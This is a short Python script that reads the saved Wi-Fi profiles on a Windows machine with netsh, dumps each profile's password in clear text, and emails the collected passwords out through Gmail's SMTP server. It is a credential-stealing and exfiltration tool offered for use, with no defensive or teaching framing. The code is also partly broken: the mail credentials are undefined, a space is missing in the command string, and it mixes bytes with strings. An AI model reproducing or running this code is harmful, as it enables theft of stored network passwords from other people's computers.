##  it will give list of passwords stored on windows.
import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output((command), shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", str(networks))
# print(network_names_list)

result = ""
for network_name in network_names_list:
    command1 = "netsh wlan show profile " + network_name + "key=clear"
    current_result = subprocess.check_output(command1, shell=True)
    result = result + current_result


send_mail(email, password, result)  # email to which u want to recieve email of report
